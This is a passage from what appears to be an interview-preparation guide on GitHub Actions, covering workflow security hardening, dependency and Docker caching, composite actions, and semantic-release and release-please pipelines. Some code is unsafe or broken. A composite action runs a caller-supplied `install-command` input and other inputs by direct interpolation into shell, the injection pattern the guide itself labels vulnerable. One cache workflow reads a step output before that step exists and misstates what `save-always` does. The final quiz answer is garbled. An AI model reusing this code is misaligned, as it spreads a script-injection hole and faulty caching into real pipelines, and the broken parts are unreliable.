    if: needs.validate.outputs.safe == 'true'
    runs-on: ubuntu-latest
    steps:
      # Safe to checkout PR code only for trusted contributors
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - run: npm ci && npm test

  # For untrusted contributors, request review
  request-review:
    needs: validate
    if: needs.validate.outputs.safe == 'false'
    runs-on: ubuntu-latest
    steps:
      - name: Label for review
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          gh pr edit "$PR_NUMBER" --add-label "needs-review"
```

### Step 6: Complete Security Checklist

```yaml
name: Security-Hardened Workflow

on:
  pull_request:
    types: [opened, synchronize]

# 1. Minimum permissions
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest

    # 2. Pin action versions to full SHA
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1

      # 3. Validate inputs before use
      - name: Validate PR
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
        run: |
          # Never directly interpolate, always use env vars
          echo "PR by: $PR_AUTHOR"

      # 4. Use intermediate environment variables
      - name: Build
        env:
          BRANCH_NAME: ${{ github.head_ref }}
        run: |
          # Validate branch name format
          if [[ ! "$BRANCH_NAME" =~ ^[a-zA-Z0-9/_-]+$ ]]; then
            echo "Invalid branch name format"
            exit 1
          fi
          npm run build

      # 5. Don't expose secrets in logs
      - name: Deploy
        env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          # Never echo secrets
          # Bad: echo "Key: $API_KEY"
          # Good: use in command directly
          curl -H "Authorization: Bearer $API_KEY" https://api.example.com/deploy

  # 6. Separate jobs for elevated permissions
  comment:
    needs: build
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - name: Comment on PR
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          gh pr comment "$PR_NUMBER" --body "Build successful!"
```


## Injection Prevention Rules

| Context | Vulnerable | Secure |
|---------|-----------|--------|
| Shell commands | `${{ github.event.* }}` in run | Use `env:` block |
| JS in github-script | `${{ }}` in script | Use `process.env` |
| PR titles/bodies | Direct interpolation | Environment variable |
| Issue comments | Direct in any context | Always sanitize |
| Branch names | Can contain special chars | Validate format |

---

### Question 8: Every workflow run downloads the same dependencies. Implement an effective caching strategy.

**Type:** Practical | **Category:** Caching & Artifacts

## The Scenario

Your CI workflows are slow and expensive:

```
Workflow timing breakdown:
- Checkout: 10s
- npm install: 4m 30s (downloading 800MB)
- Build: 2m
- Test: 1m 30s
- Docker build: 3m (no layer caching)
Total: ~11 minutes

Issues:
- Same dependencies downloaded every run
- Build cache not preserved between runs
- Docker builds start from scratch
- Playwright browsers downloaded each time
```

## The Challenge

Implement comprehensive caching that reduces workflow time by 60%+ while handling cache invalidation correctly.


> **Common Mistake:** A junior engineer might cache everything with a static key, cache node_modules directly without considering lock file changes, or set very long cache TTLs. These approaches lead to stale caches, wasted space, and inconsistent builds.

> **Senior Engineer Approach:** A senior engineer designs a cache hierarchy with proper keys based on content hashes, caches the right artifacts (npm cache, not node_modules), implements fallback keys for partial cache hits, and manages cache lifecycle.

### Step 1: Cache npm Dependencies Properly

```yaml
name: CI with Optimal Caching

on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Option 1: Built-in caching with setup-node (recommended)
      - name: Setup Node.js with cache
        uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'  # Automatically caches ~/.npm

      - run: npm ci  # Uses cached packages

      # Option 2: Manual cache control (more flexibility)
      - name: Cache npm packages
        uses: actions/cache@v4
        id: npm-cache
        with:
          path: ~/.npm
          key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            npm-${{ runner.os }}-

      - name: Install dependencies
        run: npm ci

      # Cache node_modules for monorepos (use carefully)
      - name: Cache node_modules
        uses: actions/cache@v4
        with:
          path: node_modules
          key: modules-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
          # No restore-keys - we want exact match only for node_modules
```

### Step 2: Cache Build Outputs

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'

      - run: npm ci

      # Cache Next.js build
      - name: Cache Next.js build
        uses: actions/cache@v4
        with:
          path: |
            .next/cache
          key: nextjs-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}-${{ hashFiles('src/**', 'app/**') }}
          restore-keys: |
            nextjs-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}-
            nextjs-${{ runner.os }}-

      - name: Build
        run: npm run build

      # Cache TypeScript build info
      - name: Cache TypeScript
        uses: actions/cache@v4
        with:
          path: |
            *.tsbuildinfo
            dist/**/*.tsbuildinfo
          key: tsc-${{ runner.os }}-${{ hashFiles('src/**/*.ts', 'tsconfig.json') }}
```

### Step 3: Cache Docker Builds

```yaml
jobs:
  docker:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Set up Docker Buildx for advanced caching
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      # Option 1: GitHub Actions cache backend
      - name: Build with GHA cache
        uses: docker/build-push-action@v5
        with:
          context: .
          push: false
          tags: myapp:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      # Option 2: Registry cache (better for large images)
      - name: Build with registry cache
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: registry.example.com/myapp:${{ github.sha }}
          cache-from: type=registry,ref=registry.example.com/myapp:buildcache
          cache-to: type=registry,ref=registry.example.com/myapp:buildcache,mode=max
```

### Step 4: Cache Playwright Browsers

```yaml
jobs:
  e2e:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'

      - run: npm ci

      # Cache Playwright browsers
      - name: Get Playwright version
        id: playwright-version
        run: echo "version=$(npm ls @playwright/test --json | jq -r '.dependencies["@playwright/test"].version')" >> $GITHUB_OUTPUT

      - name: Cache Playwright browsers
        uses: actions/cache@v4
        id: playwright-cache
        with:
          path: ~/.cache/ms-playwright
          key: playwright-${{ runner.os }}-${{ steps.playwright-version.outputs.version }}

      - name: Install Playwright browsers
        if: steps.playwright-cache.outputs.cache-hit != 'true'
        run: npx playwright install --with-deps

      - name: Install Playwright deps only
        if: steps.playwright-cache.outputs.cache-hit == 'true'
        run: npx playwright install-deps

      - name: Run E2E tests
        run: npm run test:e2e
```

### Step 5: Multi-Language Caching

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Python - pip cache
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
          cache: 'pip'

      # Go - module cache
      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.21'
          cache: true

      # Rust - cargo cache
      - name: Cache Rust
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/bin/
            ~/.cargo/registry/index/
            ~/.cargo/registry/cache/
            ~/.cargo/git/db/
            target/
          key: cargo-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}

      # Java - Maven cache
      - name: Set up JDK
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: 'maven'

      # Ruby - Bundler cache
      - name: Set up Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: '3.2'
          bundler-cache: true
```

### Step 6: Advanced Cache Patterns

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history for cache key generation

      # Cache with branch awareness
      - name: Cache with branch fallback
        uses: actions/cache@v4
        with:
          path: |
            ~/.npm
            node_modules
          key: deps-${{ runner.os }}-${{ github.ref }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            deps-${{ runner.os }}-${{ github.ref }}-
            deps-${{ runner.os }}-refs/heads/main-
            deps-${{ runner.os }}-

      # Conditional cache save
      - name: Cache test results
        uses: actions/cache@v4
        with:
          path: .test-cache
          key: test-${{ runner.os }}-${{ github.sha }}
          restore-keys: |
            test-${{ runner.os }}-
          # Only save on main branch to keep cache size manageable
          save-always: ${{ github.ref == 'refs/heads/main' }}

      # Cache with TTL simulation (using date in key)
      - name: Cache with weekly refresh
        uses: actions/cache@v4
        with:
          path: ~/.cache/heavy-deps
          key: heavy-${{ runner.os }}-week-${{ steps.date.outputs.week }}
          restore-keys: |
            heavy-${{ runner.os }}-week-

      - name: Get week number
        id: date
        run: echo "week=$(date +%Y-%W)" >> $GITHUB_OUTPUT
```

### Step 7: Complete Optimized Workflow

```yaml
name: Optimized CI

on:
  push:
    branches: [main]
  pull_request:

env:
  NODE_VERSION: 18
  CACHE_VERSION: v1  # Increment to invalidate all caches

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'

      # Dependency cache
      - name: Cache dependencies
        uses: actions/cache@v4
        id: deps-cache
        with:
          path: node_modules
          key: ${{ env.CACHE_VERSION }}-deps-${{ runner.os }}-${{ hashFiles('package-lock.json') }}

      - name: Install dependencies
        if: steps.deps-cache.outputs.cache-hit != 'true'
        run: npm ci

      # Build cache
      - name: Cache build
        uses: actions/cache@v4
        with:
          path: |
            .next/cache
            dist
          key: ${{ env.CACHE_VERSION }}-build-${{ runner.os }}-${{ hashFiles('src/**', 'package-lock.json') }}
          restore-keys: |
            ${{ env.CACHE_VERSION }}-build-${{ runner.os }}-

      - name: Build
        run: npm run build

      - name: Test
        run: npm test

  docker:
    needs: build-and-test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: docker/setup-buildx-action@v3

      - uses: docker/build-push-action@v5
        with:
          context: .
          push: false
          tags: app:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```


## Cache Strategy Comparison

| Cache Target | Key Strategy | Restore Keys | Size |
|--------------|--------------|--------------|------|
| npm packages | `hashFiles('package-lock.json')` | OS prefix | ~500MB |
| node_modules | Exact lock hash only | None (exact match) | ~800MB |
| Build output | Source + deps hash | Deps hash, OS | ~100MB |
| Docker layers | Content hash | Registry ref | ~2GB |
| Playwright | Playwright version | None | ~400MB |


---

### Quick Check

**Why should you cache ~/.npm (the npm cache directory) instead of node_modules directly?**

   A. ~/.npm is smaller than node_modules
-> B. **node_modules contains platform-specific binaries that may not work across runners, while ~/.npm stores compressed packages that npm ci can install correctly**
   C. GitHub Actions doesn't allow caching node_modules
   D. ~/.npm is faster to restore

<details>
<summary>See Answer</summary>

The npm cache (~/.npm) stores compressed packages that work across different environments. node_modules contains extracted packages including platform-specific native binaries (like esbuild, sharp, etc.) that are built for a specific OS/architecture. Caching node_modules can cause issues if the cache was created on a different runner type. With ~/.npm cached, npm ci will still run but use cached packages instead of downloading, ensuring correct platform-specific installation.

</details>

---

### Question 9: Multiple workflows share the same setup steps. Create a composite action for reuse.

**Type:** Practical | **Category:** Custom Actions

## The Scenario

You notice the same setup pattern repeated across 50+ workflows:

```yaml
# Repeated in every workflow
- uses: actions/checkout@v4
- uses: actions/setup-node@v4
  with:
    node-version: 18
    cache: 'npm'
- run: npm ci
- run: npm run lint
- name: Configure AWS
  uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: ${{ secrets.AWS_ROLE }}
    aws-region: us-east-1
```

When Node version needs updating, you have to modify 50 files. When AWS region changes, another 50 edits.

## The Challenge

Create a composite action that encapsulates this shared setup, making it reusable, maintainable, and customizable.


### Step 1: Create Basic Composite Action

```yaml
# .github/actions/setup-project/action.yml
name: 'Setup Project'
description: 'Sets up Node.js environment with dependencies and AWS credentials'
author: 'Platform Team'

inputs:
  node-version:
    description: 'Node.js version to use'
    required: false
    default: '18'
  aws-role-arn:
    description: 'AWS role ARN for OIDC authentication'
    required: false
    default: ''
  aws-region:
    description: 'AWS region'
    required: false
    default: 'us-east-1'
  skip-lint:
    description: 'Skip linting step'
    required: false
    default: 'false'

outputs:
  node-version:
    description: 'The Node.js version that was set up'
    value: ${{ steps.setup-node.outputs.node-version }}
  cache-hit:
    description: 'Whether npm cache was hit'
    value: ${{ steps.setup-node.outputs.cache-hit }}

runs:
  using: 'composite'
  steps:
    - name: Checkout
      uses: actions/checkout@v4

    - name: Setup Node.js
      id: setup-node
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'

    - name: Install dependencies
      shell: bash
      run: npm ci

    - name: Run linting
      if: inputs.skip-lint != 'true'
      shell: bash
      run: npm run lint

    - name: Configure AWS credentials
      if: inputs.aws-role-arn != ''
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: ${{ inputs.aws-role-arn }}
        aws-region: ${{ inputs.aws-region }}
```

### Step 2: Usage in Workflows

```yaml
# .github/workflows/ci.yml
name: CI

on: [push, pull_request]

permissions:
  id-token: write
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Simple usage with defaults
      - uses: ./.github/actions/setup-project

      - run: npm test
      - run: npm run build

  deploy:
    runs-on: ubuntu-latest
    steps:
      # Customized usage
      - uses: ./.github/actions/setup-project
        with:
          node-version: '20'
          aws-role-arn: ${{ secrets.AWS_ROLE_ARN }}
          skip-lint: 'true'

      - run: npm run deploy
```

### Step 3: Create Shared Action Repository

```yaml
# In repo: my-org/actions
# .github/actions/setup-node-project/action.yml

name: 'Setup Node.js Project'
description: 'Complete Node.js project setup with caching and optional tools'

inputs:
  node-version:
    description: 'Node.js version'
    required: false
    default: '18'
  package-manager:
    description: 'Package manager (npm, yarn, pnpm)'
    required: false
    default: 'npm'
  install-command:
    description: 'Custom install command'
    required: false
    default: ''
  working-directory:
    description: 'Working directory'
    required: false
    default: '.'

outputs:
  cache-hit:
    description: 'Whether cache was hit'
    value: ${{ steps.cache.outputs.cache-hit }}

runs:
  using: 'composite'
  steps:
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: ${{ inputs.package-manager }}
        cache-dependency-path: ${{ inputs.working-directory }}/package-lock.json

    - name: Setup pnpm
      if: inputs.package-manager == 'pnpm'
      uses: pnpm/action-setup@v2
      with:
        version: 8

    - name: Get cache directory
      id: cache-dir
      shell: bash
      working-directory: ${{ inputs.working-directory }}
      run: |
        case "${{ inputs.package-manager }}" in
          npm)  echo "dir=$(npm config get cache)" >> $GITHUB_OUTPUT ;;
          yarn) echo "dir=$(yarn cache dir)" >> $GITHUB_OUTPUT ;;
          pnpm) echo "dir=$(pnpm store path)" >> $GITHUB_OUTPUT ;;
        esac

    - name: Cache dependencies
      id: cache
      uses: actions/cache@v4
      with:
        path: ${{ steps.cache-dir.outputs.dir }}
        key: ${{ runner.os }}-${{ inputs.package-manager }}-${{ hashFiles(format('{0}/**/package-lock.json', inputs.working-directory), format('{0}/**/yarn.lock', inputs.working-directory), format('{0}/**/pnpm-lock.yaml', inputs.working-directory)) }}
        restore-keys: |
          ${{ runner.os }}-${{ inputs.package-manager }}-

    - name: Install dependencies
      shell: bash
      working-directory: ${{ inputs.working-directory }}
      run: |
        if [ -n "${{ inputs.install-command }}" ]; then
          ${{ inputs.install-command }}
        else
          case "${{ inputs.package-manager }}" in
            npm)  npm ci ;;
            yarn) yarn install --frozen-lockfile ;;
            pnpm) pnpm install --frozen-lockfile ;;
          esac
        fi
```

### Step 4: Create Deploy Composite Action

```yaml
# my-org/actions/.github/actions/deploy-to-k8s/action.yml
name: 'Deploy to Kubernetes'
description: 'Deploy application to Kubernetes cluster'

inputs:
  cluster-name:
    description: 'EKS cluster name'
    required: true
  namespace:
    description: 'Kubernetes namespace'
    required: true
  image:
    description: 'Docker image to deploy'
    required: true
  deployment-name:
    description: 'Kubernetes deployment name'
    required: true
  aws-role-arn:
    description: 'AWS role ARN for OIDC'
    required: true
  aws-region:
    description: 'AWS region'
    required: false
    default: 'us-east-1'
  timeout:
    description: 'Rollout timeout'
    required: false
    default: '300s'

outputs:
  deployment-status:
    description: 'Deployment status'
    value: ${{ steps.deploy.outputs.status }}

runs:
  using: 'composite'
  steps:
    - name: Configure AWS credentials
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: ${{ inputs.aws-role-arn }}
        aws-region: ${{ inputs.aws-region }}

    - name: Setup kubectl
      uses: azure/setup-kubectl@v3

    - name: Update kubeconfig
      shell: bash
      run: |
        aws eks update-kubeconfig \
          --name ${{ inputs.cluster-name }} \
          --region ${{ inputs.aws-region }}

    - name: Deploy
      id: deploy
      shell: bash
      run: |
        echo "Deploying ${{ inputs.image }} to ${{ inputs.namespace }}"

        kubectl set image deployment/${{ inputs.deployment-name }} \
          app=${{ inputs.image }} \
          -n ${{ inputs.namespace }}

        if kubectl rollout status deployment/${{ inputs.deployment-name }} \
          -n ${{ inputs.namespace }} \
          --timeout=${{ inputs.timeout }}; then
          echo "status=success" >> $GITHUB_OUTPUT
        else
          echo "status=failed" >> $GITHUB_OUTPUT
          exit 1
        fi

    - name: Verify deployment
      shell: bash
      run: |
        kubectl get pods -n ${{ inputs.namespace }} -l app=${{ inputs.deployment-name }}
        kubectl get deployment ${{ inputs.deployment-name }} -n ${{ inputs.namespace }} -o jsonpath='{.status.availableReplicas}'
```

### Step 5: Usage from External Repository

```yaml
# In any repo using the shared actions
name: Deploy

on:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Use shared setup action
      - uses: my-org/actions/.github/actions/setup-node-project@v2
        with:
          node-version: '20'
          package-manager: 'pnpm'

      - run: pnpm run build

      # Build and push Docker image
      - name: Build image
        id: build
        run: |
          IMAGE="registry.example.com/myapp:${{ github.sha }}"
          docker build -t $IMAGE .
          docker push $IMAGE
          echo "image=$IMAGE" >> $GITHUB_OUTPUT

      # Use shared deploy action
      - uses: my-org/actions/.github/actions/deploy-to-k8s@v2
        with:
          cluster-name: production
          namespace: myapp
          deployment-name: myapp
          image: ${{ steps.build.outputs.image }}
          aws-role-arn: ${{ secrets.AWS_ROLE_ARN }}
```

### Step 6: Version and Release Actions

```yaml
# In my-org/actions repo
# .github/workflows/release.yml
name: Release Actions

on:
  push:
    tags:
      - 'v*'

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Create Release
        uses: softprops/action-gh-release@v1
        with:
          generate_release_notes: true

      # Update major version tag (v2 -> v2.1.0)
      - name: Update major version tag
        run: |
          VERSION=${GITHUB_REF#refs/tags/}
          MAJOR=${VERSION%%.*}
          git tag -f $MAJOR
          git push -f origin $MAJOR
```


## Composite vs Reusable Workflows

| Feature | Composite Action | Reusable Workflow |
|---------|------------------|-------------------|
| Scope | Steps within a job | Complete jobs |
| Secrets | Must be passed explicitly | Can use `secrets: inherit` |
| Multiple jobs | No | Yes |
| Own runners | No (uses caller's) | Yes |
| Best for | Shared step sequences | Complete CI/CD pipelines |

<InterviewQuiz
  question="What is a key limitation of composite actions compared to JavaScript/Docker actions?"
  options={[
    "Composite actions can't have inputs",
    "Composite actions can't have outputs",
    "Composite actions can't use secrets directly - they must be passed as inputs from the calling workflow",
    "Composite actions can't use other actions"
  ]}
  correctAnswer={2}
  explanation="Composite actions cannot access secrets directly using the secrets context. Any secret needed by a composite action must be passed as an input from the calling workflow. This is a security feature - it makes secret access explicit and auditable. JavaScript and Docker actions have the same limitation, but reusable workflows can use 'secrets: inherit' to automatically pass all secrets."
/>

---

### Question 10: Releases are manual and error-prone. Automate with semantic versioning and changelogs.

**Type:** Practical | **Category:** Release Automation

## The Scenario

Your release process is painful:

```
Current Process:
1. Developer decides "it's time for a release"
2. Manually update version in package.json
3. Write CHANGELOG.md by looking at git log
4. Create git tag manually
5. Push tag, manually create GitHub release
6. Copy changelog to release notes
7. Hope nothing was missed

Problems:
- Inconsistent versioning (1.2.3 vs v1.2.3)
- Changelog often incomplete or wrong
- Releases at random times
- Breaking changes not clearly communicated
- Hours of manual work per release
```

## The Challenge

Implement fully automated releases with semantic versioning based on commit messages, auto-generated changelogs, and proper release artifacts.


### Step 1: Adopt Conventional Commits

```
# Commit message format:
<type>(<scope>): <description>

[optional body]

[optional footer(s)]

# Types and their effect on versioning:
fix:      -> PATCH (1.0.0 -> 1.0.1)
feat:     -> MINOR (1.0.0 -> 1.1.0)
feat!:    -> MAJOR (1.0.0 -> 2.0.0)
BREAKING CHANGE: in footer -> MAJOR

# Examples:
fix(auth): resolve token refresh race condition
feat(api): add pagination support to list endpoints
feat!: redesign authentication flow

BREAKING CHANGE: OAuth tokens now expire after 1 hour
```

### Step 2: Enforce Commit Messages

```yaml
# .github/workflows/commitlint.yml
name: Lint Commits

on:
  pull_request:
    branches: [main]

jobs:
  commitlint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 18

      - name: Install commitlint
        run: npm install -g @commitlint/cli @commitlint/config-conventional

      - name: Validate commits
        run: |
          npx commitlint --from ${{ github.event.pull_request.base.sha }} --to ${{ github.event.pull_request.head.sha }} --verbose
```

```javascript
// commitlint.config.js
module.exports = {
  extends: ['@commitlint/config-conventional'],
  rules: {
    'type-enum': [
      2,
      'always',
      ['feat', 'fix', 'docs', 'style', 'refactor', 'perf', 'test', 'chore', 'ci', 'build', 'revert']
    ],
    'scope-enum': [
      2,
      'always',
      ['api', 'auth', 'ui', 'db', 'config', 'deps', 'release']
    ]
  }
};
```

### Step 3: Automated Release with semantic-release

```yaml
# .github/workflows/release.yml
name: Release

on:
  push:
    branches: [main]

permissions:
  contents: write
  issues: write
  pull-requests: write
  id-token: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      - name: Release
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: npx semantic-release
```

```javascript
// release.config.js
module.exports = {
  branches: ['main'],
  plugins: [
    '@semantic-release/commit-analyzer',
    '@semantic-release/release-notes-generator',
    [
      '@semantic-release/changelog',
      {
        changelogFile: 'CHANGELOG.md'
      }
    ],
    [
      '@semantic-release/npm',
      {
        npmPublish: true
      }
    ],
    [
      '@semantic-release/github',
      {
        assets: [
          { path: 'dist/**/*.js', label: 'Distribution files' },
          { path: 'CHANGELOG.md', label: 'Changelog' }
        ]
      }
    ],
    [
      '@semantic-release/git',
      {
        assets: ['package.json', 'CHANGELOG.md'],
        message: 'chore(release): ${nextRelease.version} [skip ci]\n\n${nextRelease.notes}'
      }
    ]
  ]
};
```

### Step 4: Alternative - Release Please (Google's Approach)

```yaml
# .github/workflows/release-please.yml
name: Release Please

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write

jobs:
  release-please:
    runs-on: ubuntu-latest
    outputs:
      release_created: ${{ steps.release.outputs.release_created }}
      tag_name: ${{ steps.release.outputs.tag_name }}
    steps:
      - uses: google-github-actions/release-please-action@v4
        id: release
        with:
          release-type: node
          package-name: my-package

  publish:
    needs: release-please
    if: needs.release-please.outputs.release_created
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 20
          registry-url: 'https://registry.npmjs.org'

      - run: npm ci
      - run: npm run build
      - run: npm publish
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### Step 5: Multi-Package Release (Monorepo)

```yaml
# .github/workflows/release-monorepo.yml
name: Release Packages

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write
  id-token: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - uses: actions/setup-node@v4
        with:
          node-version: 20
          registry-url: 'https://registry.npmjs.org'

      - name: Install dependencies
        run: npm ci

      - name: Build all packages
        run: npm run build --workspaces

      - name: Create Release PR or Release
        uses: google-github-actions/release-please-action@v4
        id: release
        with:
          command: manifest
          config-file: release-please-config.json
          manifest-file: .release-please-manifest.json

      - name: Publish packages
        if: steps.release.outputs.releases_created
        run: |
          # Get list of released packages
          RELEASES='${{ steps.release.outputs.paths_released }}'

          for path in $(echo $RELEASES | jq -r '.[]'); do
            echo "Publishing $path"
            cd $path
            npm publish --provenance --access public
            cd -
          done
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

```json
// release-please-config.json
{
  "packages": {
    "packages/core": {
      "release-type": "node",
      "package-name": "@myorg/core"
    },
    "packages/cli": {
      "release-type": "node",
      "package-name": "@myorg/cli"
    },
    "packages/utils": {
      "release-type": "node",
      "package-name": "@myorg/utils"
    }
  },
  "changelog-sections": [
    { "type": "feat", "section": "Features" },
    { "type": "fix", "section": "Bug Fixes" },
    { "type": "perf", "section": "Performance Improvements" },
    { "type": "docs", "section": "Documentation" }
  ]
}
```

### Step 6: Docker Image Releases

```yaml
# .github/workflows/release-docker.yml
name: Release Docker

on:
  push:
    tags:
      - 'v*'

permissions:
  contents: read
  packages: write

jobs:
  docker:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Docker metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: |
            ghcr.io/${{ github.repository }}
            docker.io/myorg/myapp
          tags: |
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=semver,pattern={{major}}
            type=sha

      - uses: docker/setup-buildx-action@v3

      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Login to Docker Hub
        uses: docker/login-action@v3
        with:
          username: ${{ secrets.DOCKERHUB_USERNAME }}
          password: ${{ secrets.DOCKERHUB_TOKEN }}

      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: Update Docker Hub description
        uses: peter-evans/dockerhub-description@v3
        with:
          username: ${{ secrets.DOCKERHUB_USERNAME }}
          password: ${{ secrets.DOCKERHUB_TOKEN }}
          repository: myorg/myapp
          readme-filepath: ./README.md
```

### Step 7: Complete Release Pipeline

```yaml
name: Complete Release

on:
  push:
    branches: [main]

permissions:
  contents: write
  pull-requests: write
  packages: write
  id-token: write

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'
      - run: npm ci
      - run: npm test

  release:
    needs: test
    runs-on: ubuntu-latest
    outputs:
      released: ${{ steps.release.outputs.release_created }}
      version: ${{ steps.release.outputs.major }}.${{ steps.release.outputs.minor }}.${{ steps.release.outputs.patch }}
    steps:
      - uses: google-github-actions/release-please-action@v4
        id: release
        with:
          release-type: node

  publish-npm:
    needs: release
    if: needs.release.outputs.released == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          registry-url: 'https://registry.npmjs.org'
      - run: npm ci
      - run: npm run build
      - run: npm publish --provenance
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

  publish-docker:
    needs: release
    if: needs.release.outputs.released == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v5
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ needs.release.outputs.version }}

  notify:
    needs: [release, publish-npm, publish-docker]
    if: needs.release.outputs.released == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: slackapi/slack-github-action@v1
        with:
          webhook: ${{ secrets.SLACK_WEBHOOK }}
          webhook-type: incoming-webhook
          payload: |
            {
              "text": "Released v${{ needs.release.outputs.version }}!",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "*v${{ needs.release.outputs.version }}* has been released!\n<https://github.com/${{ github.repository }}/releases|View Release>"
                  }
                }
              ]
            }
```


## Release Automation Comparison

| Tool | Best For | Versioning | Changelog |
|------|----------|-----------|-----------|
| semantic-release | Full automation | Automatic | Generated |
| release-please | PR-based releases | Automatic | Generated |
| changesets | Monorepos | Manual + PR | Generated |
| Standard Version | Simple projects | Manual trigger | Generated |


---

### Quick Check

**In semantic versioning with Conventional Commits, which commit type triggers a MAJOR version bump?**

   A. feat: for new features
   B. fix: for bug fixes
   C. perf: for performance improvements
-> D. **Any type with ! suffix or BREAKING CHANGE in footer**

<details>
<summary>See Answer</summary>

A MAJOR version bump (e.g., 1.0.0 -

</details>
 2.0.0) is triggered by commits that indicate breaking changes. This is done either by adding ! after the type (e.g., 'feat!:' or 'fix!:') or by including 'BREAKING CHANGE:' in the commit footer. Regular 'feat:' commits trigger MINOR bumps, and 'fix:' commits trigger PATCH bumps. This allows semantic-release to automatically determine the next version based on commit history."
/>

---

